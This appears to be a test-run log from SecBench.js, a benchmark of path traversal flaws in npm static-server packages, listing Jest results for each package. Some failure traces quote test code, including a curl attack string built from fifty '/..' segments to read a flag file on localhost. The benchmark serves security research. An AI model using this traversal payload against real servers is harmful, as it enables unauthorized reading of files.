+  ✓ Path Traversal in web-node-server (54 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.321 s
+Ran all test suites matching path-traversal/web-node-server_0.1.0/web-node-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/web-node-server_0.1.0/web-node-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/yjmyjmyjm_1.0.0/yjmyjmyjm.test.js
+8888/tcp:           
+ PASS  ./yjmyjmyjm.test.js
+  ✓ Path Traversal in yjmyjmyjm (2042 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.35 s
+Ran all test suites matching path-traversal/yjmyjmyjm_1.0.0/yjmyjmyjm.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/yjmyjmyjm_1.0.0/yjmyjmyjm.test.js'], returncode=0)
+TEST PASSED
+path-traversal/lihuini_1.0.0/lihuini.test.js
+8888/tcp:           
+ PASS  ./lihuini.test.js
+  ✓ Path Traversal in lihuini (2058 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.377 s
+Ran all test suites matching path-traversal/lihuini_1.0.0/lihuini.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/lihuini_1.0.0/lihuini.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wenluhong11_1.0.0/wenluhong11.test.js
+8888/tcp:           
+ PASS  ./wenluhong11.test.js
+  ✓ Path Traversal in wenluhong11 (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.355 s
+Ran all test suites matching path-traversal/wenluhong11_1.0.0/wenluhong11.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wenluhong11_1.0.0/wenluhong11.test.js'], returncode=0)
+TEST PASSED
+path-traversal/liuyaserver_1.0.0/liuyaserver.test.js
+4848/tcp:           
+ PASS  ./liuyaserver.test.js
+  ✓ Path Traversal in liuyaserver (2043 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.353 s
+Ran all test suites matching path-traversal/liuyaserver_1.0.0/liuyaserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/liuyaserver_1.0.0/liuyaserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/xingbaohai_1.0.0/xingbaohai.test.js
+8888/tcp:           
+ PASS  ./xingbaohai.test.js
+  ✓ Path Traversal in xingbaohai (2060 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.363 s
+Ran all test suites matching path-traversal/xingbaohai_1.0.0/xingbaohai.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/xingbaohai_1.0.0/xingbaohai.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverwzl_1.3.1/serverwzl.test.js
+8888/tcp:           
+ PASS  ./serverwzl.test.js
+  ✓ Path Traversal in serverwzl (2052 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.363 s
+Ran all test suites matching path-traversal/serverwzl_1.3.1/serverwzl.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverwzl_1.3.1/serverwzl.test.js'], returncode=0)
+TEST PASSED
+path-traversal/mfrserver_1.0.0/mfrserver.test.js
+8888/tcp:           
+ PASS  ./mfrserver.test.js
+  ✓ Path Traversal in mfrserver (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.368 s
+Ran all test suites matching path-traversal/mfrserver_1.0.0/mfrserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/mfrserver_1.0.0/mfrserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverwg_1.0.0/serverwg.test.js
+8888/tcp:           
+ PASS  ./serverwg.test.js
+  ✓ Path Traversal in serverwg (2046 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.349 s
+Ran all test suites matching path-traversal/serverwg_1.0.0/serverwg.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverwg_1.0.0/serverwg.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverliujiayi1_1.1.0/serverliujiayi1.test.js
+9000/tcp:           
+ PASS  ./serverliujiayi1.test.js
+  ✓ Path Traversal in serverliujiayi1 (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.347 s
+Ran all test suites matching path-traversal/serverliujiayi1_1.1.0/serverliujiayi1.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverliujiayi1_1.1.0/serverliujiayi1.test.js'], returncode=0)
+TEST PASSED
+path-traversal/hostr_2.0.0/hostr.test.js
+3000/tcp:           
+ PASS  ./hostr.test.js
+  ✓ Path Traversal in hostr (2052 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.356 s
+Ran all test suites matching path-traversal/hostr_2.0.0/hostr.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/hostr_2.0.0/hostr.test.js'], returncode=0)
+TEST PASSED
+path-traversal/servershuai_1.2.0/servershuai.test.js
+8888/tcp:           
+ PASS  ./servershuai.test.js
+  ✓ Path Traversal in servershuai (2051 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.365 s
+Ran all test suites matching path-traversal/servershuai_1.2.0/servershuai.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/servershuai_1.2.0/servershuai.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ritp_1.0.5/ritp.test.js
+8080/tcp:           
+ PASS  ./ritp.test.js
+  ✓ Path Traversal in ritp (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.355 s
+Ran all test suites matching path-traversal/ritp_1.0.5/ritp.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ritp_1.0.5/ritp.test.js'], returncode=0)
+TEST PASSED
+path-traversal/mcstatic_0.0.20/mcstatic.test.js
+8080/tcp:           
+ PASS  ./mcstatic.test.js
+  ✓ Path Traversal in mcstatic (2044 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.359 s
+Ran all test suites matching path-traversal/mcstatic_0.0.20/mcstatic.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/mcstatic_0.0.20/mcstatic.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serveryaozeyan_1.0.4/serveryaozeyan.test.js
+8888/tcp:           
+ PASS  ./serveryaozeyan.test.js
+  ✓ Path Traversal in serveryaozeyan (2053 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.369 s
+Ran all test suites matching path-traversal/serveryaozeyan_1.0.4/serveryaozeyan.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serveryaozeyan_1.0.4/serveryaozeyan.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wenluhong1_1.0.0/wenluhong1.test.js
+8888/tcp:           
+ PASS  ./wenluhong1.test.js
+  ✓ Path Traversal in wenluhong1 (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.354 s
+Ran all test suites matching path-traversal/wenluhong1_1.0.0/wenluhong1.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wenluhong1_1.0.0/wenluhong1.test.js'], returncode=0)
+TEST PASSED
+path-traversal/caihong_1.0.0/caihong.test.js
+8888/tcp:           
+ PASS  ./caihong.test.js
+  ✓ Path Traversal in caihong (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.366 s
+Ran all test suites matching path-traversal/caihong_1.0.0/caihong.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/caihong_1.0.0/caihong.test.js'], returncode=0)
+TEST PASSED
+path-traversal/peiserver_1.0.0/peiserver.test.js
+8888/tcp:           
+ PASS  ./peiserver.test.js
+  ✓ Path Traversal in peiserver (2044 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.35 s
+Ran all test suites matching path-traversal/peiserver_1.0.0/peiserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/peiserver_1.0.0/peiserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/tinyserver2_0.5.2/tinyserver2.test.js
+8976/tcp:           
+ PASS  ./tinyserver2.test.js
+  ✓ Path Traversal in tinyserver2 (2054 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.369 s
+Ran all test suites matching path-traversal/tinyserver2_0.5.2/tinyserver2.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/tinyserver2_0.5.2/tinyserver2.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wrlc_0.2.5/wrlc.test.js
+ PASS  ./wrlc.test.js
+  ✓ Path Traversal in wrlc (31 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.187 s, estimated 1 s
+Ran all test suites matching path-traversal/wrlc_0.2.5/wrlc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wrlc_0.2.5/wrlc.test.js'], returncode=0)
+TEST PASSED
+path-traversal/dilu_0.1.3/dilu.test.js
+9000/tcp:           
+ PASS  ./dilu.test.js
+  ✓ Path Traversal in dilu (2055 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.376 s
+Ran all test suites matching path-traversal/dilu_0.1.3/dilu.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/dilu_0.1.3/dilu.test.js'], returncode=0)
+TEST PASSED
+path-traversal/httpea_3.0.4/httpea.test.js
+8080/tcp:           
+ PASS  ./httpea.test.js
+  ✓ Path Traversal in httpea (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.361 s
+Ran all test suites matching path-traversal/httpea_3.0.4/httpea.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/httpea_3.0.4/httpea.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverlyr_1.1.0/serverlyr.test.js
+8888/tcp:           
+ PASS  ./serverlyr.test.js
+  ✓ Path Traversal in serverlyr (2053 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.367 s
+Ran all test suites matching path-traversal/serverlyr_1.1.0/serverlyr.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverlyr_1.1.0/serverlyr.test.js'], returncode=0)
+TEST PASSED
+path-traversal/file-static-server_1.0.2/file-static-server.test.js
+8970/tcp:           
+ PASS  ./file-static-server.test.js
+  ✓ Path Traversal in file-static-server (2038 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.34 s
+Ran all test suites matching path-traversal/file-static-server_1.0.2/file-static-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/file-static-server_1.0.2/file-static-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/gyfserver_1.0.0/gyfserver.test.js
+8888/tcp:           
+ PASS  ./gyfserver.test.js
+  ✓ Path Traversal in gyfserver (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.363 s
+Ran all test suites matching path-traversal/gyfserver_1.0.0/gyfserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/gyfserver_1.0.0/gyfserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/statics-server_0.0.9/statics-server.test.js
+8080/tcp:           
+ PASS  ./statics-server.test.js
+  ✓ Path Traversal in statics-server (2039 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.352 s
+Ran all test suites matching path-traversal/statics-server_0.0.9/statics-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/statics-server_0.0.9/statics-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/server12311_1.2.0/server12311.test.js
+8888/tcp:           
+ PASS  ./server12311.test.js
+  ✓ Path Traversal in server12311 (2051 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.364 s
+Ran all test suites matching path-traversal/server12311_1.2.0/server12311.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/server12311_1.2.0/server12311.test.js'], returncode=0)
+TEST PASSED
+path-traversal/fast-http-cli_0.0.8/fast-http-cli.test.js
+8892/tcp:           
+ PASS  ./fast-http-cli.test.js
+  ✓ Path Traversal in fast-http-cli (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.354 s
+Ran all test suites matching path-traversal/fast-http-cli_0.0.8/fast-http-cli.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/fast-http-cli_0.0.8/fast-http-cli.test.js'], returncode=0)
+TEST PASSED
+path-traversal/pytservce_1.0.0/pytservce.test.js
+8888/tcp:           
+ PASS  ./pytservce.test.js
+  ✓ Path Traversal in pytservce (2056 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.374 s
+Ran all test suites matching path-traversal/pytservce_1.0.0/pytservce.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/pytservce_1.0.0/pytservce.test.js'], returncode=0)
+TEST PASSED
+path-traversal/node-http-server_8.1.2/node-http-server.test.js
+ PASS  ./node-http-server.test.js
+  ✓ Path Traversal in node-http-server (47 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.289 s
+Ran all test suites matching path-traversal/node-http-server_8.1.2/node-http-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/node-http-server_8.1.2/node-http-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/glance_3.0.0/glance.test.js
+ FAIL  ./glance.test.js
+  ✕ Path Traversal in glance (9 ms)
+
+  ● Path Traversal in glance
+
+    Jest encountered an unexpected token
+
+    Jest failed to parse a file. This happens e.g. when your code or its dependencies use non-standard JavaScript syntax, or when Jest is not configured to support such syntax.
+
+    Out of the box Jest supports Babel, which will be used to transform your files into valid JS based on your Babel configuration.
+
+    By default "node_modules" folder is ignored by transformers.
+
+    Here's what you can do:
+     • If you are trying to use ECMAScript Modules, see https://jestjs.io/docs/ecmascript-modules for how to enable it.
+     • If you are trying to use TypeScript, see https://jestjs.io/docs/getting-started#using-typescript
+     • To have some of your "node_modules" files transformed, you can specify a custom "transformIgnorePatterns" in your config.
+     • If you need a custom transformation, specify a "transform" option in your config.
+     • If you simply want to mock your non-JS modules (e.g. binary assets) you can stub them out with the "moduleNameMapper" config option.
+
+    You'll find more details and examples of these config options in the docs:
+    https://jestjs.io/docs/configuration
+    For information about custom transformations, see:
+    https://jestjs.io/docs/code-transformation
+
+    Details:
+
+    /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/glance_3.0.0/node_modules/mime/dist/src/index.js:1
+    import otherTypes from '../types/other.js';
+    ^^^^^^
+
+    SyntaxError: Cannot use import statement outside a module
+
+       8 |   expect.assertions(1);
+       9 |   const http = require("http");
+    > 10 |   const glance = require("glance");
+         |                  ^
+      11 |   const fs = require("fs");
+      12 |   const { exec } = require("child_process");
+      13 |   let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+      at Runtime.createScriptFromCode (../../../../../.npm/_npx/b8d86e6551a4f492/node_modules/jest-runtime/build/index.js:1314:40)
+      at Object.<anonymous> (node_modules/filed/main.js:6:12)
+      at Object.<anonymous> (node_modules/glance/index.js:8:13)
+      at Object.require (glance.test.js:10:18)
+
+  ● Path Traversal in glance
+
+    expect.assertions(1)
+
+    Expected one assertion to be called but received zero assertion calls.
+
+       6 | }
+       7 | test("Path Traversal in glance", (done) => {
+    >  8 |   expect.assertions(1);
+         |          ^
+       9 |   const http = require("http");
+      10 |   const glance = require("glance");
+      11 |   const fs = require("fs");
+
+      at Object.assertions (glance.test.js:8:10)
+
+Test Suites: 1 failed, 1 total
+Tests:       1 failed, 1 total
+Snapshots:   0 total
+Time:        0.286 s
+Ran all test suites matching path-traversal/glance_3.0.0/glance.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+path-traversal/node-cxc_1.0.0/node-cxc.test.js
+ FAIL  ./node-cxc.test.js (5.263 s)
+  ✕ Path Traversal in node-cxc (5005 ms)
+
+  ● Path Traversal in node-cxc
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: "<!DOCTYPE html>
+    <html>
+    <body>·
+    <h1>CISPA</h1>
+    <p>vulns4js! is here.</p>·
+    </body>
+    </html> "
+    Received: ""
+
+      26 |   let attack_string = `curl -v --path-as-is "http://127.0.0.1:80${genstr()}"`;
+      27 |   exec(attack_string, (error, stdout) => {
+    > 28 |     expect(stdout).toBe(hostsFile);
+         |                    ^
+      29 |     done();
+      30 |   });
+      31 | });
+
+      at toBe (node-cxc.test.js:28:20)
+
+  ● Path Traversal in node-cxc
+
+    thrown: "Exceeded timeout of 5000 ms for a test while waiting for `done()` to be called.
+    Add a timeout value to this test to increase the timeout, if this is a long-running test. See https://jestjs.io/docs/api#testname-fn-timeout."
+
+      11 |   return "/..".repeat(50) + pathToFlag;
+      12 | }
+    > 13 | test("Path Traversal in node-cxc", (done) => {
+         | ^
+      14 |   expect.assertions(1);
+      15 |   const fs = require("fs");
+      16 |   const sleep = require("sleep");
+
+      at Object.test (node-cxc.test.js:13:1)
+
+Test Suites: 1 failed, 1 total
+Tests:       1 failed, 1 total
+Snapshots:   0 total
+Time:        5.318 s
+Ran all test suites matching path-traversal/node-cxc_1.0.0/node-cxc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+path-traversal/songcaihong_1.0.0/songcaihong.test.js
+8888/tcp:           
+ PASS  ./songcaihong.test.js
+  ✓ Path Traversal in songcaihong (2046 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.358 s
+Ran all test suites matching path-traversal/songcaihong_1.0.0/songcaihong.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/songcaihong_1.0.0/songcaihong.test.js'], returncode=0)
+TEST PASSED
+path-traversal/isv-http_0.0.9/isv-http.test.js
+ PASS  ./isv-http.test.js
+  ✓ Path Traversal in isv-http (89 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.322 s
+Ran all test suites matching path-traversal/isv-http_0.0.9/isv-http.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/isv-http_0.0.9/isv-http.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverxxx_1.0.0/serverxxx.test.js
+8888/tcp:           
+ PASS  ./serverxxx.test.js
+  ✓ Path Traversal in serverxxx (2062 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.405 s
+Ran all test suites matching path-traversal/serverxxx_1.0.0/serverxxx.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverxxx_1.0.0/serverxxx.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rollup-plugin-server_0.7.0/rollup-plugin-server.test.js
+ PASS  ./rollup-plugin-server.test.js
+  ✓ Path Traversal in rollup-plugin-server (42 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.276 s
+Ran all test suites matching path-traversal/rollup-plugin-server_0.7.0/rollup-plugin-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rollup-plugin-server_0.7.0/rollup-plugin-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/api-proxy_0.0.2/api-proxy.test.js
+  console.log
+    server started on port:8888
+
+      at Server.complete (node_modules/api-proxy/lib/index.js:59:11)
+
+ PASS  ./api-proxy.test.js
+  ✓ Path Traversal in api-proxy (51 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.278 s
+Ran all test suites matching path-traversal/api-proxy_0.0.2/api-proxy.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/api-proxy_0.0.2/api-proxy.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rollup-plugin-serve-favicon_0.4.2/rollup-plugin-serve-favicon.test.js
+ PASS  ./rollup-plugin-serve-favicon.test.js
+  ✓ Path Traversal in  rollup-plugin-serve-favicon (43 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.288 s
+Ran all test suites matching path-traversal/rollup-plugin-serve-favicon_0.4.2/rollup-plugin-serve-favicon.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rollup-plugin-serve-favicon_0.4.2/rollup-plugin-serve-favicon.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverfff_1.1.1/serverfff.test.js
+8888/tcp:           
+ PASS  ./serverfff.test.js
+  ✓ Path Traversal in serverfff (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.369 s
+Ran all test suites matching path-traversal/serverfff_1.1.1/serverfff.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverfff_1.1.1/serverfff.test.js'], returncode=0)
+TEST PASSED
+path-traversal/liyujing_1.1.0/liyujing.test.js
+8888/tcp:           
+ PASS  ./liyujing.test.js
+  ✓ Path Traversal in liyujing (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.37 s
+Ran all test suites matching path-traversal/liyujing_1.1.0/liyujing.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/liyujing_1.1.0/liyujing.test.js'], returncode=0)
+TEST PASSED
+path-traversal/fbr-client_1.0.3/fbr-client.test.js
+9001/tcp:           
+ PASS  ./fbr-client.test.js
+  ✓ Path Traversal in fbr-client (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.362 s
+Ran all test suites matching path-traversal/fbr-client_1.0.3/fbr-client.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/fbr-client_1.0.3/fbr-client.test.js'], returncode=0)
+TEST PASSED
+path-traversal/der-server_0.0.9/der-server.test.js
+  console.log
+    Server running at http://127.0.0.1:8887
+
+      at Object.start (node_modules/der-server/der-server.js:67:13)
+
+  console.log
+    the dir is: "/home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/der-server_0.0.9"
+
+      at Object.start (node_modules/der-server/der-server.js:68:13)
+
+ PASS  ./der-server.test.js
+  ✓ Path Traversal in der-server (57 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.285 s
+Ran all test suites matching path-traversal/der-server_0.0.9/der-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/der-server_0.0.9/der-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/yxxserver_1.0.0/yxxserver.test.js
+8888/tcp:           
+ PASS  ./yxxserver.test.js
+  ✓ Path Traversal in yxxserver (2041 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.386 s
+Ran all test suites matching path-traversal/yxxserver_1.0.0/yxxserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/yxxserver_1.0.0/yxxserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/express-blinker_0.0.6/express-blinker.test.js
+ FAIL  ./express-blinker.test.js
+  ✕ Path Traversal in express-blinker (15 ms)
+
+  ● Path Traversal in express-blinker
+
+    Cannot find module 'express' from 'express-blinker.test.js'
+
+       6 | test("Path Traversal in express-blinker", (done) => {
+       7 |   expect.assertions(1);
+    >  8 |   const express = require("express");
+         |                   ^
+       9 |   let app = express();
+      10 |   const pkg = require("express-blinker");
+      11 |   const fs = require("fs");
+
+      at Resolver._throwModNotFoundError (../../../../../.npm/_npx/b8d86e6551a4f492/node_modules/jest-resolve/build/index.js:863:11)
+      at Object.require (express-blinker.test.js:8:19)
+
+  ● Path Traversal in express-blinker
+
+    expect.assertions(1)
+
+    Expected one assertion to be called but received zero assertion calls.
+
+       5 | }
+       6 | test("Path Traversal in express-blinker", (done) => {
+    >  7 |   expect.assertions(1);
+         |          ^
+       8 |   const express = require("express");
+       9 |   let app = express();
+      10 |   const pkg = require("express-blinker");
+
+      at Object.assertions (express-blinker.test.js:7:10)
+
+Test Suites: 1 failed, 1 total
